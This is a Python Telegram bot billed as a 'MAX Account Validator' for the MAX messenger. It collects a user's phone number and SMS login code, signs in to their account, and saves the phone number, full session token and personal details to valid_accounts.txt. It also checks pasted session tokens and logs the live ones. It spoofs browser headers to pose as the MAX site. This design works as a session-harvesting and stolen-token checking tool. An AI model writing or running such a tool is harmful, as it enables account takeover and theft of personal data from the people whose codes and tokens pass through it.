import asyncio
import telebot
from telebot import types
import logging
import json
import websockets

BOT_TOKEN = "СЮДА_ТОКЕН_ОТ_BOTFATHER"

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

user_states = {}

MAX_WS_URL = "wss://max.ru/ws"
MAX_REQUEST_CODE_URL = "https://max.ru/api/auth/request_code"
MAX_CONFIRM_CODE_URL = "https://max.ru/api/auth/confirm_code"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://max.ru",
    "Referer": "https://max.ru/auth/login"
}

# ============ ПРОВЕРКА ТОКЕНА ЧЕРЕЗ WEBSOCKET ============

async def check_token_ws(access_token):
    """Проверяет токен через WebSocket (десктопный протокол MAX)."""
    try:
        async with websockets.connect(MAX_WS_URL, extra_headers=HEADERS, timeout=15) as ws:
            # Отправляем токен на проверку
            auth_msg = json.dumps({
                "op": "auth_check",
                "token": access_token
            })
            await ws.send(auth_msg)
            
            # Ждём ответ
            response = await asyncio.wait_for(ws.recv(), timeout=10)
            data = json.loads(response)
            
            if data.get("status") == "ok" or data.get("valid"):
                user = data.get("user", {})
                info = f"ID: {user.get('id', 'N/A')}\nИмя: {user.get('first_name', 'N/A')} {user.get('last_name', '')}\nТелефон: {user.get('phone', 'N/A')}"
                return True, info
            else:
                return False, data.get("error", "Сессия недействительна")
    except asyncio.TimeoutError:
        return False, "Таймаут: сервер MAX не ответил"
    except websockets.exceptions.ConnectionClosed:
        return False, "Соединение закрыто сервером MAX"
    except Exception as e:
        return False, f"Ошибка WebSocket: {str(e)}"

def check_token_sync(access_token):
    """Синхронная обёртка для проверки токена."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_token_ws(access_token))
    loop.close()
    return result

# ============ ОСТАЛЬНЫЕ ФУНКЦИИ (SMS-вход) ============

def request_sms_code(phone):
    try:
        resp = __import__('requests').post(MAX_REQUEST_CODE_URL, headers=HEADERS, json={"phone": phone, "type": "login"}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("success"):
            return True, data.get("session_id", ""), "Код отправлен на номер"
        elif resp.status_code == 429:
            return False, None, "Слишком много запросов. Подождите минуту."
        elif "not found" in str(data).lower():
            return False, None, "Аккаунт с таким номером не найден"
        elif "blocked" in str(data).lower():
            return False, None, "Аккаунт заблокирован"
        else:
            return False, None, f"Ошибка MAX: {data}"
    except Exception as e:
        return False, None, f"Ошибка соединения: {e}"

def confirm_code(phone, code, session_id):
    try:
        resp = __import__('requests').post(MAX_CONFIRM_CODE_URL, headers=HEADERS, json={"phone": phone, "code": code, "session_id": session_id}, timeout=15)
        data = resp.json()
        if resp.status_code == 200 and data.get("access_token"):
            return True, data.get("access_token"), "Вход выполнен успешно"
        elif "invalid" in str(data).lower():
            return False, None, "Неверный код. Попробуйте ещё раз."
        elif "expired" in str(data).lower():
            return False, None, "Код истёк. Запросите новый."
        else:
            return False, None, f"Ошибка подтверждения: {data}"
    except Exception as e:
        return False, None, f"Ошибка соединения: {e}"

# ============ КЛАВИАТУРЫ ============

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("📱 Войти по номеру", "🔑 Войти по токену")
    return markup

def cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add("❌ Отмена")
    return markup

# ============ ОБРАБОТЧИКИ ============

@bot.message_handler(commands=['start'])
def start(message):
    user_states.pop(message.chat.id, None)
    bot.reply_to(message, "🔐 **MAX Account Validator**\n\nВыберите способ входа:", parse_mode="Markdown", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: True)
def handle_message(message):
    chat_id = message.chat.id
    text = message.text.strip()
    state = user_states.get(chat_id, {}).get("state")

    if text == "❌ Отмена":
        user_states.pop(chat_id, None)
        bot.reply_to(message, "Отменено.", reply_markup=main_keyboard())
        return

    if text == "📱 Войти по номеру":
        user_states[chat_id] = {"state": "waiting_phone", "mode": "phone"}
        bot.reply_to(message, "📱 Введите номер телефона:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return

    if text == "🔑 Войти по токену":
        user_states[chat_id] = {"state": "waiting_token", "mode": "token"}
        bot.reply_to(message, "🔑 Вставьте токен сессии MAX:", reply_markup=cancel_keyboard())
        return

    if state == "waiting_phone":
        phone = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not phone.startswith("+"):
            phone = "+7" + phone.lstrip("87")
        bot.reply_to(message, f"📱 Запрашиваю SMS-код для `{phone}`...", parse_mode="Markdown")
        success, session_id, msg = request_sms_code(phone)
        if success:
            user_states[chat_id] = {"state": "waiting_code", "phone": phone, "session_id": session_id, "mode": "phone"}
            bot.reply_to(message, f"✅ {msg}\n\n📩 Введите 6-значный код из SMS:", reply_markup=cancel_keyboard())
        else:
            bot.reply_to(message, f"❌ {msg}")

    elif state == "waiting_code":
        code = text.strip()
        if not code.isdigit() or len(code) != 6:
            bot.reply_to(message, "Код должен состоять из 6 цифр.")
            return
        phone = user_states[chat_id]["phone"]
        session_id = user_states[chat_id]["session_id"]
        bot.reply_to(message, "🔐 Выполняю вход...")
        success, access_token, msg = confirm_code(phone, code, session_id)
        if success:
            valid, info = check_token_sync(access_token) if access_token else (False, "Нет токена")
            if valid:
                bot.reply_to(message, f"🟢 **АККАУНТ ЖИВОЙ!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
                with open("valid_accounts.txt", "a") as f:
                    f.write(f"[PHONE] {phone} | {access_token} | {info}\n")
            else:
                bot.reply_to(message, f"🔴 {info}", reply_markup=main_keyboard())
            user_states.pop(chat_id, None)
        else:
            bot.reply_to(message, f"❌ {msg}")

    elif state == "waiting_token":
        access_token = text.replace(" ", "").replace("\n", "")
        if len(access_token) < 50:
            bot.reply_to(message, "❌ Слишком короткий токен.", reply_markup=cancel_keyboard())
            return
        bot.reply_to(message, "🔍 Проверяю токен через WebSocket...")
        valid, info = check_token_sync(access_token)
        if valid:
            bot.reply_to(message, f"🟢 **СЕССИЯ АКТИВНА!**\n\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_keyboard())
            with open("valid_accounts.txt", "a") as f:
                f.write(f"[TOKEN] {access_token[:40]}... | {info}\n")
        else:
            bot.reply_to(message, f"🔴 {info}", reply_markup=main_keyboard())
        user_states.pop(chat_id, None)

if __name__ == "__main__":
    print("🤖 MAX Validator запущен (HTTP + WebSocket)...")
    bot.infinity_polling()